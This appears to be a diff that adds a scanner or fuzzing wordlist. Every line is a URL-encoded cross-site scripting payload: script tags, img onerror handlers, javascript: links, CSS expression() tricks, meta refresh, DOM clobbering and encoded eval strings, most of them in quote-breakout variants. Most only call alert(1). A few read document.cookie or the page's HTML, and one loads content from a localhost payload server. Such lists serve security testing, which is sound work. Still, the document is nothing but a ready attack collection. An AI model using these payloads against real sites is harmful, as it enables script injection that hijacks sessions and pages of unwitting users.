+%22%3E%3Cimg%20src=x%20%3E%20onerror=%22console.alert(document.getElementsByTagName('html')[0].innerHTML)%22%3E  
+'%3E%3Cimg%20src=x%20%3E%20onerror=%22console.alert(document.getElementsByTagName('html')[0].innerHTML)%22%3E  
+%3Cscript%3E%20chr=String.fromCharCode(1);%20result='';%20try%7B%20result=encodeURIComponent(
+%22%3E%3Cscript%3E%20chr=String.fromCharCode(1);%20result='';%20try%7B%20result=encodeURIComponent(
+'%3E%3Cscript%3E%20chr=String.fromCharCode(1);%20result='';%20try%7B%20result=encodeURIComponent(
+%3Cscript%3E%20chr=String.fromCharCode(1);%20result='';%20try%7B%20result=encodeURI(
+%22%3E%3Cscript%3E%20chr=String.fromCharCode(1);%20result='';%20try%7B%20result=encodeURI(
+'%3E%3Cscript%3E%20chr=String.fromCharCode(1);%20result='';%20try%7B%20result=encodeURI(
+%3Cimg%20src=x%20%3E%20onerror=alert(1)%3E  
+%22%3E%3Cimg%20src=x%20%3E%20onerror=alert(1)%3E  
+'%3E%3Cimg%20src=x%20%3E%20onerror=alert(1)%3E  
+%3Csvg%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/svg%3E  
+%3Cimg%20src=xx:xx%20onerror=%22&  
+%22%3E%3Cimg%20src=xx:xx%20onerror=%22&  
+'%3E%3Cimg%20src=xx:xx%20onerror=%22&  
+%3Cimg%20src=xx:xx%20onerror=window[['alert']](1)%3E  
+%22%3E%3Cimg%20src=xx:xx%20onerror=window[['alert']](1)%3E  
+'%3E%3Cimg%20src=xx:xx%20onerror=window[['alert']](1)%3E  
+%22'%3E%3Cimg%20src=%22xx:xx%22%20on%20error=%22alert(1);%22%3E  
+%3Cimg%20src=xx:xx%20onerror=alert(1)%3E  
+%22%3E%3Cimg%20src=xx:xx%20onerror=alert(1)%3E  
+'%3E%3Cimg%20src=xx:xx%20onerror=alert(1)%3E  
+%3Cimg%20src=xx:xx%20onerror%20=alert(1);%3E  
+%22%3E%3Cimg%20src=xx:xx%20onerror%20=alert(1);%3E  
+'%3E%3Cimg%20src=xx:xx%20onerror%20=alert(1);%3E  
+%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220.1;%20URL=javascript:void()//?;URL=javascript:alert(1)//%22%3E  
+%22%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220.1;%20URL=javascript:void()//?;URL=javascript:alert(1)//%22%3E  
+'%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220.1;%20URL=javascript:void()//?;URL=javascript:alert(1)//%22%3E  
+%3Cmeta%20http-equiv=refresh%20content=%22javascript:alert('1')%22%3E  
+%22%3E%3Cmeta%20http-equiv=refresh%20content=%22javascript:alert('1')%22%3E  
+'%3E%3Cmeta%20http-equiv=refresh%20content=%22javascript:alert('1')%22%3E  
+%3Ca%20href=%22javascript:alert(1)%22%3EX%3C/a%3E  
+%22%3E%3Ca%20href=%22javascript:alert(1)%22%3EX%3C/a%3E  
+'%3E%3Ca%20href=%22javascript:alert(1)%22%3EX%3C/a%3E  
+%3Cscript%3E%20document.cookie='X';%20if(document.cookie%20!==%20'X')%20%7B%20alert(1,document.cookie);%20%7D%20%3C/script%3E  
+%22%3E%3Cscript%3E%20document.cookie='X';%20if(document.cookie%20!==%20'X')%20%7B%20alert(1,document.cookie);%20%7D%20%3C/script%3E  
+'%3E%3Cscript%3E%20document.cookie='X';%20if(document.cookie%20!==%20'X')%20%7B%20alert(1,document.cookie);%20%7D%20%3C/script%3E  
+htmlStr%20=%20'%3Ca%20href=%22javascript:alert(1)%22%3EX%3C/a%3E  
+%22%3E%3Ca%20href=%22javascript:alert(1)%22%3EX%3C/a%3E  
+'%3E%3Ca%20href=%22javascript:alert(1)%22%3EX%3C/a%3E';%20document.getElementById('body').innerHTML%20=%20htmlStr;%20try%20%7B%20alert(1);%7Dcatch(e)%7Balert(1);%7D;  
+htmlStr%20=%20'%3Ca%20href=%22javascript:alert(1)%22%3EX%3C/a%3E  
+%22%3E%3Ca%20href=%22javascript:alert(1)%22%3EX%3C/a%3E  
+'%3E%3Ca%20href=%22javascript:alert(1)%22%3EX%3C/a%3E';%20document.getElementById('body').innerHTML%20=%20htmlStr;%20try%20%7B%20if(document.getElementById('body').firstChild.protocol%20===%20'javascript:')%20%7B%20alert(1);%20%7D%20%7Dcatch(e)%7Balert(1);%7D;  
+%3Cimg%20src=x:xx%20onerror=%22try%20%7BexecScript('a=1','vbs');alert(1);%7Dcatch(e)%7Balert(1);%7D%22%3E  
+%22%3E%3Cimg%20src=x:xx%20onerror=%22try%20%7BexecScript('a=1','vbs');alert(1);%7Dcatch(e)%7Balert(1);%7D%22%3E  
+'%3E%3Cimg%20src=x:xx%20onerror=%22try%20%7BexecScript('a=1','vbs');alert(1);%7Dcatch(e)%7Balert(1);%7D%22%3E  
+%3Cdiv%20style=%22color:red'%7B%7D%20x:expression(alert(1))%22%3E.%3C/div%3E  
+%22%3E%3Cdiv%20style=%22color:red'%7B%7D%20x:expression(alert(1))%22%3E.%3C/div%3E  
+'%3E%3Cdiv%20style=%22color:red'%7B%7D%20x:expression(alert(1))%22%3E.%3C/div%3E  
+%3Cimg%20src='xx:x%3E%3Cimg%20src=xx:x%20onerror=alert(1)%3E'%3E  
+%22%3E%3Cimg%20src='xx:x%3E%3Cimg%20src=xx:x%20onerror=alert(1)%3E'%3E  
+'%3E%3Cimg%20src='xx:x%3E%3Cimg%20src=xx:x%20onerror=alert(1)%3E'%3E  
+%3Cimg%20src='xx:x/%20onerror=%22alert(1)%22%3E'%3E  
+%22%3E%3Cimg%20src='xx:x/%20onerror=%22alert(1)%22%3E'%3E  
+'%3E%3Cimg%20src='xx:x/%20onerror=%22alert(1)%22%3E'%3E  
+%3Cimg%20src='xx:x%20onerror=%22alert(1)%22%3E'%3E  
+%22%3E%3Cimg%20src='xx:x%20onerror=%22alert(1)%22%3E'%3E  
+'%3E%3Cimg%20src='xx:x%20onerror=%22alert(1)%22%3E'%3E  
+%60%22'%3E%3Cimg%20src=%22  
+%3Cimg%20src=xx:xx%20onerror=%22x='/',alert(1)//'%22%3E  
+%22%3E%3Cimg%20src=xx:xx%20onerror=%22x='/',alert(1)//'%22%3E  
+'%3E%3Cimg%20src=xx:xx%20onerror=%22x='/',alert(1)//'%22%3E  
+%3Cscript%3Ealert(alert(1))%3C/script%3E  
+%22%3E%3Cscript%3Ealert(alert(1))%3C/script%3E  
+'%3E%3Cscript%3Ealert(alert(1))%3C/script%3E  
+%3Cscript%3Ex='%3Cscript%3E%3Cimg%20src=xx:xx%20onerror=alert(1)%3E  
+%22%3E%3Cimg%20src=xx:xx%20onerror=alert(1)%3E  
+'%3E%3Cimg%20src=xx:xx%20onerror=alert(1)%3E';%3C/script%3E  
+%3Cscript%3Ealert(1)%3Cscript%3E%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3Cscript%3E%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3Cscript%3E%3C/script%3E  
+--%3E%3Cimg%20src=xxx:x%20onerror=alert(1)%3E%20--%3E  
+%3Cimg%20src=xx:xx  
+%22%3E%3Cimg%20src=xx:xx  
+'%3E%3Cimg%20src=xx:xx  
+%3Cimg%20src=xx:xx%20alt=%60/onerror=alert(1)//%60%3E  
+%22%3E%3Cimg%20src=xx:xx%20alt=%60/onerror=alert(1)//%60%3E  
+'%3E%3Cimg%20src=xx:xx%20alt=%60/onerror=alert(1)//%60%3E  
+%3Cimg%20src=xx:xx%20onerror=alert(1)%3E  
+%22%3E%3Cimg%20src=xx:xx%20onerror=alert(1)%3E  
+'%3E%3Cimg%20src=xx:xx%20onerror=alert(1)%3E%20%3Ca%20href=javascript:alert(1)%3E1%3C/a%3E  
+%22%3E%3Cimg%20src=xx:xx%20onerror=alert(1)%3E%20%3Ca%20href=javascript:alert(1)%3E1%3C/a%3E  
+'%3E%3Cimg%20src=xx:xx%20onerror=alert(1)%3E%20%3Ca%20href=javascript:alert(1)%3E1%3C/a%3E  
+%3Cscript%3Ealert(1,1%3C/script//)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1,1%3C/script//)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1,1%3C/script//)%3C/script%3E  
+%3Cscript%3Ealert(1,1%3C/script/)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1,1%3C/script/)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1,1%3C/script/)%3C/script%3E  
+%3Cbody%3E%20%C2%A7iframe%20onload=confirm(/X/)&gt;%20%3Cimg%20src=x:x%20onerror=%22innerHTML=previousSibling.nodeValue.replace('%C2%A7','%3C')%22%3E%20%3C/body%3E  
+%22%3E%3Cbody%3E%20%C2%A7iframe%20onload=confirm(/X/)&gt;%20%3Cimg%20src=x:x%20onerror=%22innerHTML=previousSibling.nodeValue.replace('%C2%A7','%3C')%22%3E%20%3C/body%3E  
+'%3E%3Cbody%3E%20%C2%A7iframe%20onload=confirm(/X/)&gt;%20%3Cimg%20src=x:x%20onerror=%22innerHTML=previousSibling.nodeValue.replace('%C2%A7','%3C')%22%3E%20%3C/body%3E  
+%3Cb%20id=%22id1%22%20x=begin0x9fa0end%20%3E%60'%22%3E%3C/b%3E%3Cscript%3Eif%20(!/begin.end/.test(document.getElementById('id1').getAttribute('x')))%20%7B%20alert(1);%7D%3C/script%3E  
+%22%3E%3Cb%20id=%22id1%22%20x=begin0x9fa0end%20%3E%60'%22%3E%3C/b%3E%3Cscript%3Eif%20(!/begin.end/.test(document.getElementById('id1').getAttribute('x')))%20%7B%20alert(1);%7D%3C/script%3E  
+'%3E%3Cb%20id=%22id1%22%20x=begin0x9fa0end%20%3E%60'%22%3E%3C/b%3E%3Cscript%3Eif%20(!/begin.end/.test(document.getElementById('id1').getAttribute('x')))%20%7B%20alert(1);%7D%3C/script%3E  
+%3Cb%20id=%22id1%22%20x=begin0x2924end%20%3E%60'%22%3E%3C/b%3E%3Cscript%3Eif%20(!/begin.end/.test(document.getElementById('id1').getAttribute('x')))%20%7B%20alert(1);%7D%3C/script%3E  
+%22%3E%3Cb%20id=%22id1%22%20x=begin0x2924end%20%3E%60'%22%3E%3C/b%3E%3Cscript%3Eif%20(!/begin.end/.test(document.getElementById('id1').getAttribute('x')))%20%7B%20alert(1);%7D%3C/script%3E  
+'%3E%3Cb%20id=%22id1%22%20x=begin0x2924end%20%3E%60'%22%3E%3C/b%3E%3Cscript%3Eif%20(!/begin.end/.test(document.getElementById('id1').getAttribute('x')))%20%7B%20alert(1);%7D%3C/script%3E  
+%3Cimg%20src=  
+%22%3E%3Cimg%20src=  
+'%3E%3Cimg%20src=  
+%3Ctitle%3EX%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/title%3E  
+%3Cdiv%20style=%22X:expression(alert(1))/%22%3E%3C/div%3E  
+%22%3E%3Cdiv%20style=%22X:expression(alert(1))/%22%3E%3C/div%3E  
+'%3E%3Cdiv%20style=%22X:expression(alert(1))/%22%3E%3C/div%3E  
+%3Cdiv%20style=%22X:expression(alert(1))'%22%3E%3C/div%3E  
+%22%3E%3Cdiv%20style=%22X:expression(alert(1))'%22%3E%3C/div%3E  
+'%3E%3Cdiv%20style=%22X:expression(alert(1))'%22%3E%3C/div%3E  
+%3Cdiv%20style=%22X:expression(alert(1))%22%3E%3C/div%3E  
+%22%3E%3Cdiv%20style=%22X:expression(alert(1))%22%3E%3C/div%3E  
+'%3E%3Cdiv%20style=%22X:expression(alert(1))%22%3E%3C/div%3E  
+%3Cdiv%20style=%22X:expression(alert(1))%22%3EX/div%3E  
+%22%3E%3Cdiv%20style=%22X:expression(alert(1))%22%3EX/div%3E  
+'%3E%3Cdiv%20style=%22X:expression(alert(1))%22%3EX/div%3E  
+%3Cimg%20src=1%20title=%20x:xx/onerror=alert(1)%3E  
+%22%3E%3Cimg%20src=1%20title=%20x:xx/onerror=alert(1)%3E  
+'%3E%3Cimg%20src=1%20title=%20x:xx/onerror=alert(1)%3E  
+%3Cscript%3Eif(%22x/%22.length==2)%20%7B%20alert(1);%7D%3C/script%3E  
+%22%3E%3Cscript%3Eif(%22x/%22.length==2)%20%7B%20alert(1);%7D%3C/script%3E  
+'%3E%3Cscript%3Eif(%22x/%22.length==2)%20%7B%20alert(1);%7D%3C/script%3E  
+%3Cscript%3Eif(%22x/%22.length==1)%20%7B%20alert(1);%7D%3C/script%3E  
+%22%3E%3Cscript%3Eif(%22x/%22.length==1)%20%7B%20alert(1);%7D%3C/script%3E  
+'%3E%3Cscript%3Eif(%22x/%22.length==1)%20%7B%20alert(1);%7D%3C/script%3E  
+%3Cimg%20src=xxx:xxx%20title=1/onerror=alert(1)%3E  
+%22%3E%3Cimg%20src=xxx:xxx%20title=1/onerror=alert(1)%3E  
+'%3E%3Cimg%20src=xxx:xxx%20title=1/onerror=alert(1)%3E  
+%3Cscript%3Eif(%22xx%22%20==%20%22xx%22)%20%7B%20alert(1);%7D%3C/script%3E  
+%22%3E%3Cscript%3Eif(%22xx%22%20==%20%22xx%22)%20%7B%20alert(1);%7D%3C/script%3E  
+'%3E%3Cscript%3Eif(%22xx%22%20==%20%22xx%22)%20%7B%20alert(1);%7D%3C/script%3E  
+%3Cimg%20src=x%20onError=%22javascript:alert(1)%22/%3E  
+'%3E%3Cscript%20type=%22text/javascript%22%3Ealert(1);%3C/script%3E  
+%3Cscript%20charset='utf-8'%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%20charset='utf-8'%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%20charset='utf-8'%3Ealert(1)%3C/script%3E  
+%3Cstyle%3E%3C/style%3E%3Cimg%20src=%22about:blank%22%20onerror=alert(1)//%3E%3C/style%3E  
+%22%3E%3Cstyle%3E%3C/style%3E%3Cimg%20src=%22about:blank%22%20onerror=alert(1)//%3E%3C/style%3E  
+'%3E%3Cstyle%3E%3C/style%3E%3Cimg%20src=%22about:blank%22%20onerror=alert(1)//%3E%3C/style%3E  
+%3Cscript%3Ea='X//';alert(1)//X';%3C/script%3E  
+%22%3E%3Cscript%3Ea='X//';alert(1)//X';%3C/script%3E  
+'%3E%3Cscript%3Ea='X//';alert(1)//X';%3C/script%3E  
+%3Cscript%3Etry%7Beval(%22%3C%3E%3C/%3E%22);alert(1)%7Dcatch(e)%7Balert(1)%7D;%3C/script%3E  
+%22%3E%3Cscript%3Etry%7Beval(%22%3C%3E%3C/%3E%22);alert(1)%7Dcatch(e)%7Balert(1)%7D;%3C/script%3E  
+'%3E%3Cscript%3Etry%7Beval(%22%3C%3E%3C/%3E%22);alert(1)%7Dcatch(e)%7Balert(1)%7D;%3C/script%3E  
+%3Cdiv%20class=%22foo1%22%3EX%3C/div%3E%20%3Cscript%3Edocument.getElementsByClassName('foo1')[0]?alert(1):0%3C/script%3E  
+%22%3E%3Cdiv%20class=%22foo1%22%3EX%3C/div%3E%20%3Cscript%3Edocument.getElementsByClassName('foo1')[0]?alert(1):0%3C/script%3E  
+'%3E%3Cdiv%20class=%22foo1%22%3EX%3C/div%3E%20%3Cscript%3Edocument.getElementsByClassName('foo1')[0]?alert(1):0%3C/script%3E  
+%22%60'/%3E%3Cimg/onload=alert(1)%20src=%22%22/%3E  
+%3C!--%3Cimg%20src=xxx:x%20onerror=alert(1)%3E%20--%3E  
+%22%3E%3C!--%3Cimg%20src=xxx:x%20onerror=alert(1)%3E%20--%3E  
+'%3E%3C!--%3Cimg%20src=xxx:x%20onerror=alert(1)%3E%20--%3E  
+%3Cscript%3E/*%20*/alert(1)//%20*/%3C/script%3E  
+%22%3E%3Cscript%3E/*%20*/alert(1)//%20*/%3C/script%3E  
+'%3E%3Cscript%3E/*%20*/alert(1)//%20*/%3C/script%3E  
+%22'%60%3EX%3Cdiv%20style=%22font-family:'foo;x:expression(alert(1));/*';%22%3EX  
+%22'%60%3EX%3Cdiv%20style=%22font-family:'foo'x:expression(alert(1));/*';%22%3EX  
+%22'%60%3E%3Cscript%3Ea=/X;;i=0;alert(1);a/i;%3C/script%3E  
+%3Ca%20href=%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%22%20/%3E  
+%22'%60%3E%3Cp%3E%3Csvg%3E%3Cscript%3Ea='X;alert(1)//';%3C/script%3E%3C/p%3E  
+%3Cp%3E%3Csvg%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/p%3E  
+%3Ciframe%20src=%22vbscript:alert()%3E%3C/iframe%3E  
+%22%3E%3Ciframe%20src=%22vbscript:alert()%3E%3C/iframe%3E  
+'%3E%3Ciframe%20src=%22vbscript:alert()%3E%3C/iframe%3E  
+X%3Cdiv%20style=%22x:expression(alert(1))%22%3EX  
+X%3Cdiv%20style=%22xexpression(alert(1))%22%3EX  
+%3Cscript%20src=%22data:text/plainalert(1)%22%3E%3C/script%3E  
+%22%3E%3Cscript%20src=%22data:text/plainalert(1)%22%3E%3C/script%3E  
+'%3E%3Cscript%20src=%22data:text/plainalert(1)%22%3E%3C/script%3E  
+%3Cscript%20src=%22data:,alert(1)%22%3E%3C/script%3E  
+%22%3E%3Cscript%20src=%22data:,alert(1)%22%3E%3C/script%3E  
+'%3E%3Cscript%20src=%22data:,alert(1)%22%3E%3C/script%3E  
+%3Cscript%20src=%22data:text/plain,alert(1)%22%3E%3C/script%3E  
+%22%3E%3Cscript%20src=%22data:text/plain,alert(1)%22%3E%3C/script%3E  
+'%3E%3Cscript%20src=%22data:text/plain,alert(1)%22%3E%3C/script%3E  
+%3Cscript%3E%20if%20('a'.trim()%20===%20'')%20%7B%20alert(1);%20%7D%20%3C/script%3E  
+%22%3E%3Cscript%3E%20if%20('a'.trim()%20===%20'')%20%7B%20alert(1);%20%7D%20%3C/script%3E  
+'%3E%3Cscript%3E%20if%20('a'.trim()%20===%20'')%20%7B%20alert(1);%20%7D%20%3C/script%3E  
+%22'%60%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22'%60%3E%3Cimg%20src=xxx:x%20onerror=alert(1)%3E  
+'%60%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%60%22'%3E%3Cimg%20src=xxx:x%20onerror=alert(1)%3E  
+'%22%60%3E%3Cscript%3E/*%20*alert(1)//%20*/%3C/script%3E  
+%60'%22%3E%3Cscript%3Ewindow['alert'](1)%3C/script%3E  
+/u0031+/u0031/u005b'/145/166/141/154'/u005d/u0028'/141/154/145/162/164/50/61/51'/u0029  
+/u0030/u005b/u0022/x65/x76/x61/x6C%22/u005d/u0028/u0027/x61/x6C/x65/x72/x74/x28/x31/x29'/u0029  
+0['eval']('alert(1)')  
+%3Ca%20href=%22javascript:/u0031+/u0031/u005b'/145/166/141/154'/u005d/u0028'/141/154/145/162/164/50/61/51'/u0029%22%3EX%3C/a%3E  
+%22%3E%3Ca%20href=%22javascript:/u0031+/u0031/u005b'/145/166/141/154'/u005d/u0028'/141/154/145/162/164/50/61/51'/u0029%22%3EX%3C/a%3E  
+'%3E%3Ca%20href=%22javascript:/u0031+/u0031/u005b'/145/166/141/154'/u005d/u0028'/141/154/145/162/164/50/61/51'/u0029%22%3EX%3C/a%3E  
+%3Ca%20href=%22&  
+%22%3E%3Ca%20href=%22&  
+'%3E%3Ca%20href=%22&  
+%3Cinput%20id='1'%3E%3Cinput%20id=1%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cinput%20id='1'%3E%3Cinput%20id=1%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cinput%20id='1'%3E%3Cinput%20id=1%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%3Ca%20href=%22invalid:1%22%20id=x%20name=y%3EX%3C/a%3E%3Ca%20href=%22invalid:2%22%20id=x%20name=y%3EX%3C/a%3E%3Cscript%3Ealert(x.y[0])%3C/script%3E  
+%22%3E%3Ca%20href=%22invalid:1%22%20id=x%20name=y%3EX%3C/a%3E%3Ca%20href=%22invalid:2%22%20id=x%20name=y%3EX%3C/a%3E%3Cscript%3Ealert(x.y[0])%3C/script%3E  
+'%3E%3Ca%20href=%22invalid:1%22%20id=x%20name=y%3EX%3C/a%3E%3Ca%20href=%22invalid:2%22%20id=x%20name=y%3EX%3C/a%3E%3Cscript%3Ealert(x.y[0])%3C/script%3E  
+%3Ca%20href=1%20name=x%3EX%3C/a%3E%3Ca%20href=1%20name=x%3EX%3C/a%3E%3Cscript%3Ealert(x.removeChild)//undefinedalert(x.parentNode)//undefined%3C/script%3E  
+%22%3E%3Ca%20href=1%20name=x%3EX%3C/a%3E%3Ca%20href=1%20name=x%3EX%3C/a%3E%3Cscript%3Ealert(x.removeChild)//undefinedalert(x.parentNode)//undefined%3C/script%3E  
+'%3E%3Ca%20href=1%20name=x%3EX%3C/a%3E%3Ca%20href=1%20name=x%3EX%3C/a%3E%3Cscript%3Ealert(x.removeChild)//undefinedalert(x.parentNode)//undefined%3C/script%3E  
+%3Ca%20href=%22123%22%20id=x%3EX%3C/a%3E%3Cscript%3Ex='javascript:alert(1)'//only%20in%20compat!;%3C/script%3E  
+%22%3E%3Ca%20href=%22123%22%20id=x%3EX%3C/a%3E%3Cscript%3Ex='javascript:alert(1)'//only%20in%20compat!;%3C/script%3E  
+'%3E%3Ca%20href=%22123%22%20id=x%3EX%3C/a%3E%3Cscript%3Ex='javascript:alert(1)'//only%20in%20compat!;%3C/script%3E  
+%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+%22%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+'%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22%3E  
+%22%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+%22%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+'%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22%3E  
+'%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+%22%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+'%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22%3E%3C/form%3E%3Cscript%3Eif(top!=self)%7B%20top.location=self.location%7D%3C/script%3E  
+%22%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22%3E%3C/form%3E%3Cscript%3Eif(top!=self)%7B%20top.location=self.location%7D%3C/script%3E  
+'%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22%3E%3C/form%3E%3Cscript%3Eif(top!=self)%7B%20top.location=self.location%7D%3C/script%3E  
+%3Cform%20name=self%20location=%22javascript&amp;  
+%22%3E%3Cform%20name=self%20location=%22javascript&amp;  
+'%3E%3Cform%20name=self%20location=%22javascript&amp;  
+%3Ciframe%20name=x%3E%3C/iframe%3E%22%3E%3C/iframe%3E%3Ca%20href=%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22%20target=x%20id=x%3E%3C/a%3E%3Cscript%3Ewindow.onload=function()%7Bx.click()%7D%3C/script%3E  
+%22%3E%3Ciframe%20name=x%3E%3C/iframe%3E%22%3E%3C/iframe%3E%3Ca%20href=%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22%20target=x%20id=x%3E%3C/a%3E%3Cscript%3Ewindow.onload=function()%7Bx.click()%7D%3C/script%3E  
+'%3E%3Ciframe%20name=x%3E%3C/iframe%3E%22%3E%3C/iframe%3E%3Ca%20href=%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22%20target=x%20id=x%3E%3C/a%3E%3Cscript%3Ewindow.onload=function()%7Bx.click()%7D%3C/script%3E  
+%3Cform%20name%3D%22body%22%20onmouseover%3D%22alert(1)%22%20style%3D%22height%3A800px%22%3E%3Cfieldset%20name%3D%22attributes%22%3E%3Cform%3E%3C%2Fform%3E%3Cform%20name%3D%22parentNode%22%3E%3Cimg%20id%3D%22attributes%22%3E%3C%2Fform%3E%3C%2Ffieldset%3E%3C%2Fform%3E  
+%22onmouseover=%22alert(1)%22a=%22  
+'onmouseover='alert(1)'a='  
+'%20onmouseover=alert(1)'  
+%22%20onmouseover=javascript:alert(1)%20%22  
+/');alert(1);//  
+);alert(1)//  
+');alert(1)//  
+%26%2339;-alert(1)//  
+%22);alert(1);//  
+%E0%3Cbody%20onload=alert(1)%3E  
+X'%20alert(1)%2F%2F  
+X%22%20alert(1)%2F%2F  
+%5C%5C'%2Balert(1)%3B%2F%2F  
+%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E  
+alert(1)%3B  
+%3Cscript%3Ea%3D%2FX%2F  
+alert(1)%3C%2Fscript%3E  
+%22%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E  
+X%20-%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E  
+X%20%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E  
+%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+%3CMETA%20HTTP-EQUIV=%22Link%22%20Content=%22%3Cjavascript:alert(1)%3E;%20REL=stylesheet%22%3E  
+%22%3E%3CMETA%20HTTP-EQUIV=%22Link%22%20Content=%22%3Cjavascript:alert(1)%3E;%20REL=stylesheet%22%3E  
+'%3E%3CMETA%20HTTP-EQUIV=%22Link%22%20Content=%22%3Cjavascript:alert(1)%3E;%20REL=stylesheet%22%3E  
+%3CSTYLE%3E.X%7Bbackground-image:url(%22javascript:alert(1)%22);%7D%3C/STYLE%3E  
+%22%3E%3CSTYLE%3E.X%7Bbackground-image:url(%22javascript:alert(1)%22);%7D%3C/STYLE%3E  
+'%3E%3CSTYLE%3E.X%7Bbackground-image:url(%22javascript:alert(1)%22);%7D%3C/STYLE%3E%3CA%20CLASS=X%3E%3C/A%3E  
+%22%3E%3CSTYLE%3E.X%7Bbackground-image:url(%22javascript:alert(1)%22);%7D%3C/STYLE%3E%3CA%20CLASS=X%3E%3C/A%3E  
+'%3E%3CSTYLE%3E.X%7Bbackground-image:url(%22javascript:alert(1)%22);%7D%3C/STYLE%3E%3CA%20CLASS=X%3E%3C/A%3E  
+%22%3E%3CA%20CLASS=X%3E%3C/A%3E  
+'%3E%3CA%20CLASS=X%3E%3C/A%3E  
+%3C!--%3Cvalue%3E%3C![CDATA[%3CXML%20ID=I%3E%3CX%3E%3CC%3E%3C![CDATA[%3CIMG%20SRC=%22javas%3C![CDATA[cript:alert(1);%22%3E  
+%22%3E%3C!--%3Cvalue%3E%3C![CDATA[%3CXML%20ID=I%3E%3CX%3E%3CC%3E%3C![CDATA[%3CIMG%20SRC=%22javas%3C![CDATA[cript:alert(1);%22%3E  
+'%3E%3C!--%3Cvalue%3E%3C![CDATA[%3CXML%20ID=I%3E%3CX%3E%3CC%3E%3C![CDATA[%3CIMG%20SRC=%22javas%3C![CDATA[cript:alert(1);%22%3E  
+%3Cimg%20src=a%20onerror=alert(1)  
+%22%3E%3Cimg%20src=a%20onerror=alert(1)  
+'%3E%3Cimg%20src=a%20onerror=alert(1)%20%0A%3E  
+%22%3E%3Cimg%20src=a%20onerror=alert(1)%20%0A%3E  
+'%3E%3Cimg%20src=a%20onerror=alert(1)%20%0A%3E  
+%3Cimg%20src=%22x%22%20class=%22''onerror=alert(1)%22%3E  
+%22%3E%3Cimg%20src=%22x%22%20class=%22''onerror=alert(1)%22%3E  
+'%3E%3Cimg%20src=%22x%22%20class=%22''onerror=alert(1)%22%3E  
+0%3Caside%20xmlns=%22x%3E%3Cimg%20src=x%20onerror=alert(1)%22%3E1%3C/aside%3E  
+0%3Caside%20xmlns=%22x%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E%22%3E1%3C/aside%3E  
+0%3Caside%20xmlns=%22foo:img%20src=x%20onerror=alert(1)%3E%22%3E123  
+%3Cp%20%20style=%22font-family:'/22/3bx:expression(alert(1))/*'%22%3E  
+%22%3E%3Cp%20%20style=%22font-family:'/22/3bx:expression(alert(1))/*'%22%3E  
+'%3E%3Cp%20%20style=%22font-family:'/22/3bx:expression(alert(1))/*'%22%3E  
+%3Cp%20style=%22font-family:%20'foo/27/3b%20color/3a%20expression(alert(1))/*  
+%22%3E%3Cp%20style=%22font-family:%20'foo/27/3b%20color/3a%20expression(alert(1))/*  
+'%3E%3Cp%20style=%22font-family:%20'foo/27/3b%20color/3a%20expression(alert(1))/*  
+%3Cp%20style=%22fon/22/3e/3cimg/20src/3dx/20onerror/3d%20alert/28%201/29/3et-family:'foobar'%22%3E  
+%22%3E%3Cp%20style=%22fon/22/3e/3cimg/20src/3dx/20onerror/3d%20alert/28%201/29/3et-family:'foobar'%22%3E  
+'%3E%3Cp%20style=%22fon/22/3e/3cimg/20src/3dx/20onerror/3d%20alert/28%201/29/3et-family:'foobar'%22%3E  
+%3Cp%20style=%22filter:%20'expression(alert(1))'%22%3E  
+%22%3E%3Cp%20style=%22filter:%20'expression(alert(1))'%22%3E  
